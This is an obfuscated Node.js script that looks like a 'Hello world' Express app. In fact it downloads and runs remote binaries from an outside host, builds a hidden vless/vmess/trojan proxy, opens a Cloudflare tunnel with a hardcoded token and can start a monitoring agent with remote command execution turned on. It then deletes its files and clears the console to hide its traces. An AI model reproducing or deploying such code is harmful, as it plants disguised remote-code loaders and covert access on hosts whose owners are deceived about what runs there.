const _0x36dc22=_0x5893;(function(_0x3ba862,_0x29893d){const _0x6676d5=_0x5893,_0x3d55b8=_0x3ba862();while(!![]){try{const _0x2cb5f5=-parseInt(_0x6676d5(0x1a2))/0x1*(-parseInt(_0x6676d5(0x219))/0x2)+parseInt(_0x6676d5(0x1d0))/0x3*(parseInt(_0x6676d5(0x1c6))/0x4)+-parseInt(_0x6676d5(0x1d9))/0x5+parseInt(_0x6676d5(0x1a5))/0x6+-parseInt(_0x6676d5(0x21d))/0x7+-parseInt(_0x6676d5(0x1ef))/0x8+-parseInt(_0x6676d5(0x201))/0x9*(-parseInt(_0x6676d5(0x207))/0xa);if(_0x2cb5f5===_0x29893d)break;else _0x3d55b8['push'](_0x3d55b8['shift']());}catch(_0x31037e){_0x3d55b8['push'](_0x3d55b8['shift']());}}}(_0xf3b7,0x9cc89));const express=require(_0x36dc22(0x209)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x36dc22(0x1a3)),{promisify}=require(_0x36dc22(0x239)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x36dc22(0x216)),UPLOAD_URL=process[_0x36dc22(0x1d4)][_0x36dc22(0x203)]||'',PROJECT_URL=process['env'][_0x36dc22(0x234)]||'',AUTO_ACCESS=process[_0x36dc22(0x1d4)][_0x36dc22(0x22f)]||![],FILE_PATH=process[_0x36dc22(0x1d4)]['FILE_PATH']||_0x36dc22(0x253),SUB_PATH=process[_0x36dc22(0x1d4)][_0x36dc22(0x1fb)]||_0x36dc22(0x24a),PORT=process[_0x36dc22(0x1d4)][_0x36dc22(0x23d)]||process['env'][_0x36dc22(0x23a)]||0xbb8,UUID=process[_0x36dc22(0x1d4)]['UUID']||_0x36dc22(0x1fd),NEZHA_SERVER=process[_0x36dc22(0x1d4)][_0x36dc22(0x1a9)]||'',NEZHA_PORT=process[_0x36dc22(0x1d4)][_0x36dc22(0x1ed)]||'',NEZHA_KEY=process[_0x36dc22(0x1d4)][_0x36dc22(0x1d6)]||'',ARGO_DOMAIN=process[_0x36dc22(0x1d4)][_0x36dc22(0x20e)]||_0x36dc22(0x19b),ARGO_AUTH=process['env']['ARGO_AUTH']||'eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiNzIxMjAyODUtY2FiZi00NDZlLTg4YzYtYWUxNDU3ZDIxNTFkIiwicyI6Ik5EQTVabUprTWpRdE5HTmxOUzAwWVRZMUxXRmhaRE10Wm1aaE1EQTJPVEl5TUdWbSJ9',ARGO_PORT=process['env'][_0x36dc22(0x1a6)]||0x1f41,CFIP=process['env']['CFIP']||'www.visa.com.sg',CFPORT=process[_0x36dc22(0x1d4)][_0x36dc22(0x1cc)]||0x1bb,NAME=process[_0x36dc22(0x1d4)][_0x36dc22(0x1ce)]||_0x36dc22(0x1dc);!fs[_0x36dc22(0x1b0)](FILE_PATH)?(fs[_0x36dc22(0x1a8)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x36dc22(0x20a));let npmPath=path[_0x36dc22(0x23e)](FILE_PATH,_0x36dc22(0x21c)),phpPath=path['join'](FILE_PATH,_0x36dc22(0x22c)),webPath=path['join'](FILE_PATH,_0x36dc22(0x247)),botPath=path[_0x36dc22(0x23e)](FILE_PATH,_0x36dc22(0x223)),subPath=path[_0x36dc22(0x23e)](FILE_PATH,_0x36dc22(0x1c4)),listPath=path[_0x36dc22(0x23e)](FILE_PATH,_0x36dc22(0x1b5)),bootLogPath=path[_0x36dc22(0x23e)](FILE_PATH,_0x36dc22(0x1fe)),configPath=path['join'](FILE_PATH,_0x36dc22(0x23c));function deleteNodes(){const _0x18737c=_0x36dc22;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x24ae7e;try{_0x24ae7e=fs[_0x18737c(0x1ab)](subPath,_0x18737c(0x217));}catch{return null;}const _0x5e7c19=Buffer['from'](_0x24ae7e,_0x18737c(0x1c7))[_0x18737c(0x227)](_0x18737c(0x217)),_0x1c74ad=_0x5e7c19['split']('\x0a')[_0x18737c(0x1b4)](_0x5bce57=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x18737c(0x1c2)](_0x5bce57));if(_0x1c74ad[_0x18737c(0x1b7)]===0x0)return;return axios[_0x18737c(0x22b)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x18737c(0x252)]({'nodes':_0x1c74ad}),{'headers':{'Content-Type':_0x18737c(0x24e)}})[_0x18737c(0x230)](_0x305453=>{return null;});}catch(_0x185457){return null;}}function cleanupOldFiles(){const _0x438a8e=_0x36dc22,_0x54f04e=[_0x438a8e(0x247),_0x438a8e(0x223),'npm',_0x438a8e(0x22c),_0x438a8e(0x1c4),'boot.log'];_0x54f04e['forEach'](_0x29b0e0=>{const _0x1dde78=_0x438a8e,_0x9a0dcd=path['join'](FILE_PATH,_0x29b0e0);fs[_0x1dde78(0x1fa)](_0x9a0dcd,()=>{});});}app[_0x36dc22(0x20d)]('/',function(_0x1f0c52,_0x1dc1d7){const _0x1c1605=_0x36dc22;_0x1dc1d7['send'](_0x1c1605(0x1f6));});const config={'log':{'access':_0x36dc22(0x232),'error':_0x36dc22(0x232),'loglevel':_0x36dc22(0x251)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x36dc22(0x237),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x36dc22(0x251),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x36dc22(0x1f0),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x36dc22(0x1b8),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x36dc22(0x251)},'streamSettings':{'network':_0x36dc22(0x1e5),'security':_0x36dc22(0x251)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x36dc22(0x237),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x36dc22(0x251)},'streamSettings':{'network':'ws','security':_0x36dc22(0x251),'wsSettings':{'path':_0x36dc22(0x1bd)}},'sniffing':{'enabled':!![],'destOverride':[_0x36dc22(0x1bb),_0x36dc22(0x20c),_0x36dc22(0x1c3)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x36dc22(0x1e3)}},'sniffing':{'enabled':!![],'destOverride':[_0x36dc22(0x1bb),_0x36dc22(0x20c),_0x36dc22(0x1c3)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x36dc22(0x1b8),'protocol':_0x36dc22(0x22e),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x36dc22(0x251),'wsSettings':{'path':_0x36dc22(0x1f0)}},'sniffing':{'enabled':!![],'destOverride':[_0x36dc22(0x1bb),_0x36dc22(0x20c),_0x36dc22(0x1c3)],'metadataOnly':![]}}],'dns':{'servers':[_0x36dc22(0x1d2)]},'outbounds':[{'protocol':_0x36dc22(0x1a1),'tag':_0x36dc22(0x1ba)},{'protocol':_0x36dc22(0x1f1),'tag':_0x36dc22(0x1cd)}]};function _0x5893(_0x392deb,_0x35ca9c){const _0xf3b7c3=_0xf3b7();return _0x5893=function(_0x589350,_0x5aaeb5){_0x589350=_0x589350-0x19a;let _0xd220a3=_0xf3b7c3[_0x589350];return _0xd220a3;},_0x5893(_0x392deb,_0x35ca9c);}fs[_0x36dc22(0x1dd)](path[_0x36dc22(0x23e)](FILE_PATH,_0x36dc22(0x23c)),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x585321=_0x36dc22,_0x591a39=os[_0x585321(0x21e)]();return _0x591a39===_0x585321(0x1e9)||_0x591a39==='arm64'||_0x591a39===_0x585321(0x215)?_0x585321(0x1e9):_0x585321(0x240);}function downloadFile(_0x30a30d,_0x5e8809,_0x40f2b4){const _0x51dcfb=_0x36dc22,_0x40d9cd=path['join'](FILE_PATH,_0x30a30d),_0x7d1dc3=fs[_0x51dcfb(0x1c9)](_0x40d9cd);axios({'method':_0x51dcfb(0x20d),'url':_0x5e8809,'responseType':_0x51dcfb(0x202)})[_0x51dcfb(0x1d8)](_0x2de890=>{const _0x71fe31=_0x51dcfb;_0x2de890['data'][_0x71fe31(0x233)](_0x7d1dc3),_0x7d1dc3['on']('finish',()=>{const _0x341b6c=_0x71fe31;_0x7d1dc3[_0x341b6c(0x1b3)](),console['log'](_0x341b6c(0x243)+_0x30a30d+_0x341b6c(0x19d)),_0x40f2b4(null,_0x30a30d);}),_0x7d1dc3['on']('error',_0x1e187e=>{const _0x438646=_0x71fe31;fs['unlink'](_0x40d9cd,()=>{});const _0x39cf50=_0x438646(0x243)+_0x30a30d+_0x438646(0x238)+_0x1e187e[_0x438646(0x235)];console['error'](_0x39cf50),_0x40f2b4(_0x39cf50);});})['catch'](_0x5cd63a=>{const _0x118bff=_0x51dcfb,_0x41a684=_0x118bff(0x243)+_0x30a30d+'\x20failed:\x20'+_0x5cd63a[_0x118bff(0x235)];console[_0x118bff(0x241)](_0x41a684),_0x40f2b4(_0x41a684);});}async function downloadFilesAndRun(){const _0x2a90af=_0x36dc22,_0x17b889=getSystemArchitecture(),_0x3756da=getFilesForArchitecture(_0x17b889);if(_0x3756da[_0x2a90af(0x1b7)]===0x0){console['log'](_0x2a90af(0x244));return;}const _0x1b1635=_0x3756da[_0x2a90af(0x1ac)](_0x3f04ed=>{return new Promise((_0x489459,_0x1bd89e)=>{const _0x542c6d=_0x5893;downloadFile(_0x3f04ed[_0x542c6d(0x1f9)],_0x3f04ed[_0x542c6d(0x229)],(_0x58b9fd,_0x548a57)=>{_0x58b9fd?_0x1bd89e(_0x58b9fd):_0x489459(_0x548a57);});});});try{await Promise[_0x2a90af(0x1d7)](_0x1b1635);}catch(_0x25572e){console[_0x2a90af(0x241)](_0x2a90af(0x224),_0x25572e);return;}function _0x1c8920(_0x106125){const _0x26b711=_0x2a90af,_0x1088cb=0x1fd;_0x106125[_0x26b711(0x1f5)](_0x4041bf=>{const _0x467540=_0x26b711,_0x4f4a14=path['join'](FILE_PATH,_0x4041bf);fs['existsSync'](_0x4f4a14)&&fs[_0x467540(0x1d1)](_0x4f4a14,_0x1088cb,_0x5c12d2=>{const _0x48fe3a=_0x467540;_0x5c12d2?console[_0x48fe3a(0x241)](_0x48fe3a(0x228)+_0x4f4a14+':\x20'+_0x5c12d2):console['log']('Empowerment\x20success\x20for\x20'+_0x4f4a14+':\x20'+_0x1088cb[_0x48fe3a(0x227)](0x8));});});}const _0x22ec0b=NEZHA_PORT?[_0x2a90af(0x20f),_0x2a90af(0x208),'./bot']:['./php',_0x2a90af(0x208),_0x2a90af(0x1a7)];_0x1c8920(_0x22ec0b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12489c=NEZHA_SERVER[_0x2a90af(0x1e0)](':')?NEZHA_SERVER['split'](':')[_0x2a90af(0x1f8)]():'',_0x1d10d7=new Set([_0x2a90af(0x204),_0x2a90af(0x1e4),'2096',_0x2a90af(0x1e6),_0x2a90af(0x1d3),_0x2a90af(0x24c)]),_0x3d1e47=_0x1d10d7['has'](_0x12489c)?_0x2a90af(0x1cf):_0x2a90af(0x1ca),_0x5e8290='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x2a90af(0x1bc)+_0x3d1e47+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x2a90af(0x1dd)](path['join'](FILE_PATH,'config.yaml'),_0x5e8290);const _0x1396f3=_0x2a90af(0x1ad)+FILE_PATH+_0x2a90af(0x220)+FILE_PATH+_0x2a90af(0x1f7);try{await exec(_0x1396f3),console[_0x2a90af(0x1ea)](_0x2a90af(0x23f)),await new Promise(_0x43871e=>setTimeout(_0x43871e,0x3e8));}catch(_0x58cb97){console['error']('php\x20running\x20error:\x20'+_0x58cb97);}}else{let _0x2f3099='';const _0x52e15d=['443',_0x2a90af(0x1e4),_0x2a90af(0x1c5),_0x2a90af(0x1e6),_0x2a90af(0x1d3),_0x2a90af(0x24c)];_0x52e15d[_0x2a90af(0x1e0)](NEZHA_PORT)&&(_0x2f3099='--tls');const _0x51b0b4='nohup\x20'+FILE_PATH+_0x2a90af(0x236)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2a90af(0x1ee)+NEZHA_KEY+'\x20'+_0x2f3099+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x51b0b4),console[_0x2a90af(0x1ea)](_0x2a90af(0x1e1)),await new Promise(_0x42510d=>setTimeout(_0x42510d,0x3e8));}catch(_0x2ff4f8){console['error']('npm\x20running\x20error:\x20'+_0x2ff4f8);}}}else console['log'](_0x2a90af(0x1c1));const _0x3bf33a=_0x2a90af(0x1ad)+FILE_PATH+_0x2a90af(0x206)+FILE_PATH+_0x2a90af(0x1b1);try{await exec(_0x3bf33a),console['log']('web\x20is\x20running'),await new Promise(_0x33c1d1=>setTimeout(_0x33c1d1,0x3e8));}catch(_0x3e4ea2){console[_0x2a90af(0x241)](_0x2a90af(0x249)+_0x3e4ea2);}if(fs[_0x2a90af(0x1b0)](path[_0x2a90af(0x23e)](FILE_PATH,'bot'))){let _0x46623f;if(ARGO_AUTH[_0x2a90af(0x212)](/^[A-Z0-9a-z=]{120,250}$/))_0x46623f=_0x2a90af(0x24b)+ARGO_AUTH;else ARGO_AUTH[_0x2a90af(0x212)](/TunnelSecret/)?_0x46623f=_0x2a90af(0x1fc)+FILE_PATH+_0x2a90af(0x19c):_0x46623f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2a90af(0x1ad)+FILE_PATH+_0x2a90af(0x214)+_0x46623f+_0x2a90af(0x1c0)),console[_0x2a90af(0x1ea)](_0x2a90af(0x200)),await new Promise(_0xc44e4c=>setTimeout(_0xc44e4c,0x7d0));}catch(_0x456d1c){console[_0x2a90af(0x241)](_0x2a90af(0x213)+_0x456d1c);}}await new Promise(_0x3c1600=>setTimeout(_0x3c1600,0x1388));}function getFilesForArchitecture(_0x3c5661){const _0x54797a=_0x36dc22;let _0x26353a;_0x3c5661===_0x54797a(0x1e9)?_0x26353a=[{'fileName':_0x54797a(0x247),'fileUrl':_0x54797a(0x22a)},{'fileName':_0x54797a(0x223),'fileUrl':_0x54797a(0x221)}]:_0x26353a=[{'fileName':_0x54797a(0x247),'fileUrl':_0x54797a(0x1f3)},{'fileName':_0x54797a(0x223),'fileUrl':_0x54797a(0x242)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x263dd3=_0x3c5661==='arm'?_0x54797a(0x1aa):'https://amd64.ssss.nyc.mn/agent';_0x26353a[_0x54797a(0x248)]({'fileName':'npm','fileUrl':_0x263dd3});}else{const _0x30fed5=_0x3c5661===_0x54797a(0x1e9)?_0x54797a(0x1cb):'https://amd64.ssss.nyc.mn/v1';_0x26353a[_0x54797a(0x248)]({'fileName':_0x54797a(0x22c),'fileUrl':_0x30fed5});}}return _0x26353a;}function argoType(){const _0x34d769=_0x36dc22;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x34d769(0x1ea)](_0x34d769(0x1e7));return;}if(ARGO_AUTH[_0x34d769(0x1e0)](_0x34d769(0x1a0))){fs[_0x34d769(0x1dd)](path['join'](FILE_PATH,_0x34d769(0x1d5)),ARGO_AUTH);const _0xc29f3d=_0x34d769(0x1c8)+ARGO_AUTH[_0x34d769(0x1be)]('\x22')[0xb]+_0x34d769(0x22d)+path[_0x34d769(0x23e)](FILE_PATH,_0x34d769(0x1d5))+_0x34d769(0x1ec)+ARGO_DOMAIN+_0x34d769(0x1af)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x34d769(0x1dd)](path[_0x34d769(0x23e)](FILE_PATH,_0x34d769(0x20b)),_0xc29f3d);}else console[_0x34d769(0x1ea)](_0x34d769(0x250));}argoType();async function extractDomains(){const _0x18ebe8=_0x36dc22;let _0x1e7a5a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1e7a5a=ARGO_DOMAIN,console['log'](_0x18ebe8(0x255),_0x1e7a5a),await _0x3fcbc6(_0x1e7a5a);else try{const _0x1e726e=fs['readFileSync'](path[_0x18ebe8(0x23e)](FILE_PATH,'boot.log'),_0x18ebe8(0x217)),_0x154a9a=_0x1e726e['split']('\x0a'),_0x512ad5=[];_0x154a9a[_0x18ebe8(0x1f5)](_0x4ae953=>{const _0x32be9b=_0x18ebe8,_0x42ae77=_0x4ae953['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x42ae77){const _0x3490cf=_0x42ae77[0x1];_0x512ad5[_0x32be9b(0x21a)](_0x3490cf);}});if(_0x512ad5[_0x18ebe8(0x1b7)]>0x0)_0x1e7a5a=_0x512ad5[0x0],console['log']('ArgoDomain:',_0x1e7a5a),await _0x3fcbc6(_0x1e7a5a);else{console[_0x18ebe8(0x1ea)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x18ebe8(0x231)](path['join'](FILE_PATH,_0x18ebe8(0x1fe)));async function _0x3284fa(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x12ccad){}}_0x3284fa(),await new Promise(_0x59e660=>setTimeout(_0x59e660,0xbb8));const _0x3c1c85=_0x18ebe8(0x218)+FILE_PATH+_0x18ebe8(0x1db)+ARGO_PORT;try{await exec('nohup\x20'+path[_0x18ebe8(0x23e)](FILE_PATH,_0x18ebe8(0x223))+'\x20'+_0x3c1c85+'\x20>/dev/null\x202>&1\x20&'),console[_0x18ebe8(0x1ea)]('bot\x20is\x20running.'),await new Promise(_0x1886bf=>setTimeout(_0x1886bf,0xbb8)),await extractDomains();}catch(_0x4998bf){console['error']('Error\x20executing\x20command:\x20'+_0x4998bf);}}}catch(_0x1b6781){console['error'](_0x18ebe8(0x1b6),_0x1b6781);}async function _0x3fcbc6(_0x131895){const _0x26b596=_0x18ebe8,_0x140f68=execSync(_0x26b596(0x19f),{'encoding':_0x26b596(0x217)}),_0xfc355=_0x140f68[_0x26b596(0x23b)]();return new Promise(_0x4c8749=>{setTimeout(()=>{const _0x5cef22=_0x5893,_0x289c8d={'v':'2','ps':NAME+'-'+_0xfc355,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5cef22(0x251),'net':'ws','type':'none','host':_0x131895,'path':_0x5cef22(0x1de),'tls':_0x5cef22(0x20c),'sni':_0x131895,'alpn':''},_0x25d4f4=_0x5cef22(0x254)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x131895+_0x5cef22(0x1e8)+_0x131895+_0x5cef22(0x205)+NAME+'-'+_0xfc355+_0x5cef22(0x1df)+Buffer[_0x5cef22(0x24d)](JSON[_0x5cef22(0x252)](_0x289c8d))[_0x5cef22(0x227)]('base64')+_0x5cef22(0x1a4)+UUID+'@'+CFIP+':'+CFPORT+_0x5cef22(0x246)+_0x131895+_0x5cef22(0x1e8)+_0x131895+'&path=%2Ftrojan-argo%3Fed%3D2560#'+NAME+'-'+_0xfc355+_0x5cef22(0x245);console[_0x5cef22(0x1ea)](Buffer['from'](_0x25d4f4)[_0x5cef22(0x227)](_0x5cef22(0x1c7))),fs['writeFileSync'](subPath,Buffer[_0x5cef22(0x24d)](_0x25d4f4)['toString'](_0x5cef22(0x1c7))),console[_0x5cef22(0x1ea)](FILE_PATH+_0x5cef22(0x1f4)),uplodNodes(),app['get']('/'+SUB_PATH,(_0x354755,_0x4c9f02)=>{const _0x39e800=_0x5cef22,_0x459918=Buffer[_0x39e800(0x24d)](_0x25d4f4)['toString'](_0x39e800(0x1c7));_0x4c9f02['set'](_0x39e800(0x21b),_0x39e800(0x1eb)),_0x4c9f02[_0x39e800(0x1e2)](_0x459918);}),_0x4c8749(_0x25d4f4);},0x7d0);});}}async function uplodNodes(){const _0xb29c89=_0x36dc22;if(UPLOAD_URL&&PROJECT_URL){const _0x221b40=PROJECT_URL+'/'+SUB_PATH,_0x44368f={'subscription':[_0x221b40]};try{const _0xbed2b8=await axios[_0xb29c89(0x22b)](UPLOAD_URL+_0xb29c89(0x210),_0x44368f,{'headers':{'Content-Type':'application/json'}});if(_0xbed2b8[_0xb29c89(0x1ff)]===0xc8)console[_0xb29c89(0x1ea)](_0xb29c89(0x1b2));else return null;}catch(_0x2e210c){if(_0x2e210c['response']){if(_0x2e210c[_0xb29c89(0x226)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xa8a3f1=fs[_0xb29c89(0x1ab)](listPath,_0xb29c89(0x217)),_0x4e1079=_0xa8a3f1[_0xb29c89(0x1be)]('\x0a')[_0xb29c89(0x1b4)](_0x2f5398=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x2f5398));if(_0x4e1079[_0xb29c89(0x1b7)]===0x0)return;const _0x26fcd8=JSON[_0xb29c89(0x252)]({'nodes':_0x4e1079});try{await axios[_0xb29c89(0x22b)](UPLOAD_URL+_0xb29c89(0x21f),_0x26fcd8,{'headers':{'Content-Type':'application/json'}});if(response[_0xb29c89(0x1ff)]===0xc8)console[_0xb29c89(0x1ea)](_0xb29c89(0x1b2));else return null;}catch(_0xad1ad3){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x10cf22=_0x5893,_0x5994b4=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x5994b4[_0x10cf22(0x21a)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5994b4[_0x10cf22(0x21a)](phpPath);exec(_0x10cf22(0x222)+_0x5994b4[_0x10cf22(0x23e)]('\x20')+_0x10cf22(0x1bf),_0x59256d=>{const _0x5d65b6=_0x10cf22;console[_0x5d65b6(0x19e)](),console[_0x5d65b6(0x1ea)](_0x5d65b6(0x1f2)),console[_0x5d65b6(0x1ea)](_0x5d65b6(0x1da));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x273ad0=_0x36dc22;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x273ad0(0x1ea)](_0x273ad0(0x19a));return;}try{const _0x3cb06c=await axios[_0x273ad0(0x22b)](_0x273ad0(0x211),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x273ad0(0x24e)}});console['log'](_0x273ad0(0x1b9));}catch(_0x47e478){console[_0x273ad0(0x241)](_0x273ad0(0x225)+_0x47e478['message']);}}function _0xf3b7(){const _0x219bac=['arm','log','text/plain;\x20charset=utf-8','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','NEZHA_PORT','\x20-p\x20','8839032bZWNik','/trojan-argo','blackhole','App\x20is\x20running','https://amd64.ssss.nyc.mn/web','/sub.txt\x20saved\x20successfully','forEach','Hello\x20world!','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','pop','fileName','unlink','SUB_PATH','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','a87056c0-abeb-45e4-a97e-f23bdf84d191','boot.log','status','bot\x20is\x20running','4077qpLFGL','stream','UPLOAD_URL','443','&path=%2Fvless-argo%3Fed%3D2560#','/web\x20-c\x20','5660arjEqP','./web','express','\x20already\x20exists','tunnel.yml','tls','get','ARGO_DOMAIN','./npm','/api/add-subscriptions','https://oooo.serv00.net/add-url','match','Error\x20executing\x20command:\x20','/bot\x20','aarch64','child_process','utf-8','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','2353398fGrkpA','push','Content-Type','npm','84714KLZEAb','arch','/api/add-nodes','/php\x20-c\x20\x22','https://arm64.ssss.nyc.mn/2go','rm\x20-rf\x20','bot','Error\x20downloading\x20files:','添加URL失败:\x20','response','toString','Empowerment\x20failed\x20for\x20','fileUrl','https://arm64.ssss.nyc.mn/web','post','php','\x0a\x20\x20credentials-file:\x20','trojan','AUTO_ACCESS','catch','unlinkSync','/dev/null','pipe','PROJECT_URL','message','/npm\x20-s\x20','vless','\x20failed:\x20','util','PORT','trim','config.json','SERVER_PORT','join','php\x20is\x20running','amd','error','https://amd64.ssss.nyc.mn/2go','Download\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0a\x20\x20\x20\x20','?security=tls&sni=','web','unshift','web\x20running\x20error:\x20','sub','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','2053','from','application/json','http\x20server\x20is\x20running\x20on\x20port:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','none','stringify','./tmp','\x0avless://','ARGO_DOMAIN:','Skipping\x20adding\x20automatic\x20access\x20task','leapcell.aser.cloudns.pro','/tunnel.yml\x20run','\x20successfully','clear','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','TunnelSecret','freedom','1PXUbvg','path','\x0a\x20\x20\x0atrojan://','7701900qLwpfR','ARGO_PORT','./bot','mkdirSync','NEZHA_SERVER','https://arm64.ssss.nyc.mn/agent','readFileSync','map','nohup\x20','listen','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','existsSync','/config.json\x20>/dev/null\x202>&1\x20&','Subscription\x20uploaded\x20successfully','close','filter','list.txt','Error\x20reading\x20boot.log:','length','127.0.0.1','automatic\x20access\x20task\x20added\x20successfully','direct','http','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','/vless-argo','split','\x20>/dev/null\x202>&1','\x20>/dev/null\x202>&1\x20&','NEZHA\x20variable\x20is\x20empty,skip\x20running','test','quic','sub.txt','2096','975868LwkkBa','base64','\x0a\x20\x20tunnel:\x20','createWriteStream','false','https://arm64.ssss.nyc.mn/v1','CFPORT','block','NAME','true','3RQWUwA','chmod','https+local://8.8.8.8/dns-query','2083','env','tunnel.json','NEZHA_KEY','all','then','6007740xQFOYW','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','leapcell','writeFileSync','/vmess-argo?ed=2560','\x0a\x20\x20\x0avmess://','includes','npm\x20is\x20running','send','/vmess-argo','8443','tcp','2087','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','&type=ws&host='];_0xf3b7=function(){return _0x219bac;};return _0xf3b7();}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x36dc22(0x1ae)](PORT,()=>console[_0x36dc22(0x1ea)](_0x36dc22(0x24f)+PORT+'!'));
